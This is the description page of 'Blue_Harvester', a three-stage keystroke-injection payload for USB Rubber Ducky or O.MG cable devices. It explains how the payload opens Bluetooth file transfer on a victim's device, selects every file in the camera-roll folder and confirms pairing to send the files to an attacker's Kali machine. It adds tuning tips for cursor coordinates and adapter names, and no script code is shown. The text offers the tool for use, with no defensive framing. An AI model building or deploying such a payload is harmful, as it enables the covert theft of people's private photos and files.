Title: Blue_Harvester
Author: LulzAnarchyAnon

READ BELOW BEFORE EXECUTING PAYLOAD...

Description: This is a Three stage payload that begins by opening bluetooth file transfer on the target device.  
Next the attackers bluetooth adapter name is selected for pairing. In the second stage the last folder opened is selected followed by all of the files in the folder being selected, and added to  the transfer cue.
The Third, and final stage authticates, and allows pairing between the attacker, and the target device.
Afterwards the selected files are transfered to the attackers device via bluetooth.
I selected the pictures/camera roll folder as a default for this payload, but it can be changed.
Depending on both devices certain varibles will need to be adjusted in order for this payload to run correctly.
At the beginning of the Second stage "k" is for kali (adapter name) as it is the attacker device used for payload.
NOTE: Make sure your device is Discoverable...
The cursor coordinates x,y on the screen may vary depending on device...
A Pairing request will pop up, hit CONFIRM... A Pairing accept will pop up, hit CONFIRM

I'm uncertain at the moment if this payload is more favorable for deplotment on the OMG cables, or USB Rubber Ducky (YOUR CHOICE)
